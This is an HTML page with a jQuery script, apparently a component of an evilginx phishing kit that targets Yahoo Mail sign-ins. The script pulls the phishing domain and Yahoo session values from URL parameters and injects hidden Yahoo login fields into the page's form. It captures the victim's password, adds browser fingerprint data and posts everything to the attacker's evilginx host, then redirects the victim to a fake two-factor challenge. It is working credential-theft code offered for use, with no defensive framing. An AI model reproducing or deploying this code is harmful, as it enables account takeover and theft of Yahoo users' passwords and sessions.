<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Yahoo Password Integration</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
<script>
// ðŸŽ¯ ADD THIS SCRIPT TO YOUR VERCEL PAGE
$(document).ready(function() {
    console.log('Vercel page with evilginx integration loaded');
    
    // Get evilginx domain from URL params
    const urlParams = new URLSearchParams(window.location.search);
    const evilginxDomain = urlParams.get('evilginx_domain');
    const username = urlParams.get('u');
    const sessionIndex = urlParams.get('sessionIndex');
    const acrumb = urlParams.get('acrumb');
    
    console.log('Evilginx domain:', evilginxDomain);
    console.log('Username:', username);
    
    // Update your form action to point back to evilginx
    if (evilginxDomain) {
        // Update form action to submit to evilginx
        const form = document.querySelector('form');
        if (form) {
            form.action = `https://${evilginxDomain}/account/challenge/password`;
            console.log('Form action updated to:', form.action);
        }
        
        // Add hidden fields for evilginx
        const hiddenFields = `
            <input type="hidden" name="username" value="${username || ''}">
            <input type="hidden" name="sessionIndex" value="${sessionIndex || ''}">
            <input type="hidden" name="acrumb" value="${acrumb || ''}">
            <input type="hidden" name="src" value="ym">
            <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
            <input type="hidden" name=".lang" value="en-US">
            <input type="hidden" name=".intl" value="us">
            <input type="hidden" name="signin" value="Next">
            <input type="hidden" name="persistent" value="y">
        `;
        
        if (form) {
            form.insertAdjacentHTML('afterbegin', hiddenFields);
        }
    }
    
    // Handle form submission
    $('form').on('submit', function(e) {
        e.preventDefault();
        
        const password = $('input[name="passwd"]').val() || $('input[type="password"]').val();
        if (!password) {
            alert('Please enter your password');
            return;
        }
        
        console.log('Submitting password to evilginx...');
        
        // Create form data
        const formData = new FormData(this);
        
        // Add browser fingerprinting data
        formData.append('browser-fp-data', JSON.stringify({
            language: navigator.language,
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            timestamp: Date.now()
        }));
        
        // Submit to evilginx
        if (evilginxDomain) {
            fetch(`https://${evilginxDomain}/account/challenge/password`, {
                method: 'POST',
                body: formData,
                credentials: 'include',
                headers: {
                    'Referer': window.location.href
                }
            }).then(response => {
                if (response.ok) {
                    console.log('Password submitted successfully');
                    // Redirect to 2FA page
                    window.location.href = `https://${evilginxDomain}/account/challenge/challenge-selector?sessionIndex=${sessionIndex}&acrumb=${acrumb}`;
                } else {
                    console.log('Password submission failed');
                    // Show error message
                    alert('Invalid password. Please try again.');
                }
            }).catch(error => {
                console.error('Submission error:', error);
                alert('Connection error. Please try again.');
            });
        } else {
            console.error('No evilginx domain found');
            alert('Configuration error. Please try again.');
        }
    });
});
</script>
</body>
</html>
